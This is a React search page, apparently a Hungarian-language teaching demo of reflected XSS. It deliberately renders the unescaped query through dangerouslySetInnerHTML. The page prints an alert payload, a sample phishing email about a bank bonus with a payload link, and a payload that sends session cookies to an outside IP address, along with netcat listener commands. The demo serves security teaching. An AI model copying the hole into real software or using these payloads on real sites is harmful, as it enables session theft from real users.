import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

function SearchPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const queryParams = new URLSearchParams(location.search);
  const queryFromURL = queryParams.get('query') || '';

  const [query, setQuery] = useState(queryFromURL);
  const [results, setResults] = useState([]);

  const exampleText = `Ez egy példa szöveg a keresési funkció tesztelésére. Példa szavak: React, React, JavaScript, keresés, XSS, XSS, XSS input. A kereső találatok itt jelennek meg.`;

  const handleInputChange = (e) => {
    setQuery(e.target.value);
  };

  const handleSearch = (e) => {
    e.preventDefault();
    navigate(`/search?query=${encodeURIComponent(query)}`);

    if (query) {
      const regex = new RegExp(query, 'gi');
      const matches = exampleText.match(regex);
      setResults(matches || []);
    } else {
      setResults([]);
    }
  };

  // Figyelem! Direkt XSS sebezhetőség demonstráció céljából:
  const resultsCount = results.length;
  const resultHtml = `<h2>A  ${query} keresési kifejezésre ${resultsCount} találatot találtam a példaszövegben: </h2>`;


  return (
    <div>
      <h1>Keresés a hasznos tudnivalókban (Reflected XSS)</h1>
      {/* nem ez a dangerouslySetInnerHTML az xss sérülékenység */}
      <p dangerouslySetInnerHTML={{__html: exampleText}}></p> 
      <form onSubmit={handleSearch}>
        <input
          type="text"
          value={query}
          onChange={handleInputChange}
          placeholder="Írj be egy keresési kifejezést"
        />
        <button type="submit">Keresés</button>
      </form>

      <br />
      {/* hanem ez a dangerouslySetInnerHTML az xss sérülékenység */}
      <div dangerouslySetInnerHTML={{ __html: resultHtml }} />
      {/* <h2>A  <span>{query}</span> keresési kifejezésre {resultsCount} találatot találtam a példaszövegben: </h2> */}
      <ul>
        {results.map((res, index) => (
          <li key={index}>{res}</li>
        ))}
      </ul>

      <br />
      <p>A reflected XSS példa kipróbáláshoz másold be a keresési mezőbe az alábbi link végén szereplő img szkriptet, vagy módosítsd az URL-t az alábbira: </p>
      <code>http://localhost:3000/search?query=&lt;img src&#61;x onerror&#61;"alert(document.cookie)"&gt;</code>

      <br /><br />
      <p>Lehetséges kártékony email támadási vektor példa:</p>
      <p>A 100.000 Ft bónuszhoz jóváírásához lépjen be a bank ügyfélhonlapjára és kattintson az alábbi linkre! A link 24 óráig él!</p>
      <a href="http://localhost:3000/search?query=%3Cimg%20src=1%20onerror=%22alert(document.cookie)%22%3E">100.000 Ft bónusz! Katt!</a>

      <br /><br /><br/>
      <p>Valós session cookie ellopására alkalmas payload:</p>
      <code>&lt;img src&#61;x onerror&#61;"document.location='http://172.18.193.203:81/?'+document.cookie"&gt;</code>
      <p>A támadó gépen indíts egy Netcat-et vagy egy python http szerver: <code>nc -nvlp 81</code> vagy <code>python -m http.server 81</code></p>    

    </div>
  );
}

export default SearchPage;